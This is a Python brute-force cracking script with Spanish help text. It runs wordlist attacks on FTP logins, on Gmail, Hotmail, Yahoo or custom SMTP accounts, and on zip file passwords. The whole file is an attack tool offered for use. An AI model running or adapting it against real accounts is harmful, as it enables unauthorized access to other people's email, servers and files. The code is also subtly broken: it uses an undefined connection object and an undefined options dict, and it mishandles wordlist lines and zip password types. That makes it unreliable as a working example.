#!/usr/bin/python
#-*-coding: utf-8-*-
from sys import argv
from ftplib import FTP 
from time import sleep
from smtplib import SMTP
import zipfile


def bforcezip(zipf, passwords):
	try:
		zf = zipfile.ZipFile(zipf)
	except Exception as e:
		print("Problemas al abrir '{}'\n{}".format(zipf, e))
		exit()
	for password in passwords:
		try:
			zf.extractall(pwd=password)
		except:
			print("'{}' no es la contraseña del archivo.".format(password))
		else:
			print("'{}' es la contraseña de {}.".format(password, zf))
			exit()

def bforce(users, passwords):
	for user in users:
		for password in passwords:
			try:
				server.login(user, password)
			except Exception as e:
				print("{} probablemente no es la clave de {}\n\n{}".format(password, user, e))
			else:
				print("{} es la clave de {}".format(password, user))
				exit()
		sleep(3)
				

def listaup(lista, count):
	if len(lista) >= 1:
		lista.append(lista[0])
		lista[0] = argv[count + 1]
	else:
		lista.append(argv[count + 1])
	return lista

def listaupf(lista, count):
	try:
		file = open(argv[count + 1], "r")
	except:
		print("No se pudo encontrar el siguiente archivo:\n{}".format(argv[count + 1]))
		exit()
	else:
		for line in file:
			lista.append(line)
		file.close()
		return lista

def h():
	print("\nOpciones:")
	print("\nSe debe de especificar que se va a atacar:\nftp, smtp o un archivo.zip.")
	print("\nmail: --mail\nftp: --ftp\nzip: --zip\n\nLas banderas que se pueden usar en los 3 prametros:")
	print("\n-u:  Se usa para establecer con que usuario ingresar (no sirve para el modo --zip).\n-uf: Establecer diccionario de usuarios (no sirve para el modo --zip).")
	print("-p:  Sirve para establecer una contraseña.\n-pf: Establecer diccionario de contraseñas.")
	#print("-t:  Sirve para establecer el tiempo entre cada intento.")
	print("\nSolo hay una bandera exclusiva para ftp:\n\n-hst:  Sirve para establecer la dirección del servidor.")
	print("\nBanderas para --mail:")
	print("\n\nSi se usa --mail debe usarse -gm, -hm o -yh, para escoger gmail, hotmail o yahoo.")
	print("Tambien puedes usar -o para escoger tu propio servidor smtp:\n-o dominiosmtp:puerto .")
	print("\n--zip:\n-file: Determinar la ruta del archivo.zip.")

if __name__ == '__main__':
	if len(argv) == 1:
		print("{} -h para ver las opciones.".format(argv[0]))
	elif len(argv) == 2 and argv[1] == "-h":
		h()
		exit()
	else:
		userslist = []
		passwordlist = []
		ip = str()
		argcount = 1
		fl = str()
		time = 3
		ftp, mail, bzip = False, False, False
		counto = 0
		countom = 0
		for arg in argv[1:]:
			if arg[0] != "-":
				argcount += 1
				continue
			if arg == "--ftp":
				countom += 1
				argcount += 1
				ftp = True
				continue
			elif arg == "--zip":
				countom += 1
				argcount += 1
				bzip = True
				continue
			elif arg == "--mail":
				countom += 1
				srv = str()
				argcount += 1
				mail = True
				continue
			if arg == "-uf":
				listaupf(userslist, argcount)
			elif arg == "-u":
				listaup(userslist, argcount)
			elif arg == "-hst":
				ip = argv[argcount + 1]
			elif arg == "-pf":
				listaupf(passwordlist, argcount)
			elif arg == "-p":
				listaup(passwordlist, argcount)
			elif arg == "-gm":
				counto += 1
				srv = 'smtp.gmail.com:587'
			elif arg == "-hm":
				srv = 'smtp.live.com:587'
				options["hm"] = True
			elif arg == "-yh":
				counto += 1
				srv = 'smtp.mail.yahoo.com:25'
			elif arg == "-o":
				srv = argv[argcount + 1]
				counto += 1
			elif arg == "-file":
				fl = argv[argcount + 1]
			else:
				print("No se reconoce '{}' como una bandera.".format(arg))
				exit()

			argcount += 1
			
		if countom > 1:
			print("Solo se puede escoger una función de fuerza bruta.")
			exit()
		if counto > 1:
			print("Solo se puede escoger un server smtp.")
			exit()
		if ftp == True and ip == "":
			print("para usar --ftp se ocupa determinar una ip:\n-hst (ip del servidor ftp)")
			exit()
		elif ftp == True:
			server = FTP(ip)
			try:
				conexion.login('anonymous', '')
			except:
				print("No se puede acceder al FTP de manera anonima.")
			else:
				print("El usuario es anonymous y no tiene contraseña.")
				exit()
			bforce(userslist, passwordlist)
		elif mail == True and srv != "":
			server = SMTP(srv)
			server.starttls()
			bforce(userslist, passwordlist)
		elif mail == True and srv == "":
			print("No se ha elegido un servidor smtp.")
			exit()
		elif bzip == True and fl != "":
			bforcezip(fl, passwordlist)
		else:
			print("No se ha establecido un archivo al cual atacar.")
			exit()